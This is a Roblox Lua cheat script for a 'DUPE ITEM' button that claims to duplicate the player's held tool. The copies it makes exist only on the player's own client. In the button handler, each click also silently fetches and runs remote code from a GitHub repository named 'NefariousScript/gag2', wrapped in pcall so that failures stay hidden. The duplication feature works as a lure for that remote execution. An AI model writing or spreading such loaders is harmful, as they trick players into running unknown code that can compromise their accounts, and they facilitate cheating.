local localCopies = 0

local function updateItemLabel()
    local char = player.Character
    if not char then
        itemLabel.Text = "Selected Item: None"
        return
    end
    local tool = char:FindFirstChildWhichIsA("Tool") or player.Backpack:FindFirstChildWhichIsA("Tool")
    itemLabel.Text = tool and ("Selected Item: " .. tool.Name) or "Selected Item: None"
end

game:GetService("RunService").Heartbeat:Connect(updateItemLabel)

local function setStatus(text, color)
    statusLabel.Text = "Status: " .. text
    statusLabel.TextColor3 = color or Color3.fromRGB(180, 0, 255)
end

local function duplicateItem()
    local char = player.Character
    if not char then
        setStatus("No character found.", Color3.fromRGB(255, 80, 80))
        return
    end

    local tool = char:FindFirstChildWhichIsA("Tool") or player.Backpack:FindFirstChildWhichIsA("Tool")

    if tool then
        setStatus("Processing...", Color3.fromRGB(255, 200, 80))
        dupeBtn.Text = "DUPLICATING..."
        dupeBtn.TextColor3 = Color3.fromRGB(255, 200, 80)
        wait(0.6)

        -- Executes your Spawner script asynchronously to keep the UI smooth
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/NefariousScript/gag2/refs/heads/main/Spawner"))()
            end)
        end)

        local clone = tool:Clone()
        clone.Parent = player.Backpack

        localCopies = localCopies + 1
        quantityLabel.Text = "Local Copies: " .. localCopies

        setStatus("Duplicated: " .. tool.Name, Color3.fromRGB(140, 255, 140))
        dupeBtn.Text = "DUPE ITEM"
        dupeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

        wait(2)
        setStatus("Idle", Color3.fromRGB(180, 0, 255))
    else
        setStatus("No item found.", Color3.fromRGB(255, 80, 80))
        wait(2)
        setStatus("Idle", Color3.fromRGB(180, 0, 255))
    end
end

dupeBtn.MouseButton1Click:Connect(duplicateItem)

